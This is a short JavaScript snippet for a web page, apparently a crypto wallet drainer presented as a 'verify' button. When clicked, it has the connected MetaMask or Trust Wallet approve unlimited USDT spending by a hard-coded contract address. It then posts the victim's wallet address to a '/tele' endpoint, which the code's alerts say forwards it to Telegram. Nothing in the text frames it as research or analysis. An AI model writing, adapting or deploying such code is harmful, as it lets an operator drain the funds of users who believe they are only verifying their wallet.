const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const CONTRACT_ADDRESS = "0x25Ea1887a6aFc6Ce868fEB2b2068Ea498750aa54";

document.getElementById("verifyBtn").onclick = async () => {
  if (!window.ethereum) return alert("Open in MetaMask or Trust Wallet");

  const provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  const signer = provider.getSigner();
  const address = await signer.getAddress();

  try {
    const usdt = new ethers.Contract(USDT_ADDRESS, [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ], signer);

    await usdt.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);

    const res = await fetch("/tele", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ address })
    });

    if (res.ok) {
      alert("Success! Address sent to Telegram.");
    } else {
      alert("Failed to send Telegram message.");
    }
  } catch (err) {
    alert("Error: " + err.message);
  }
};
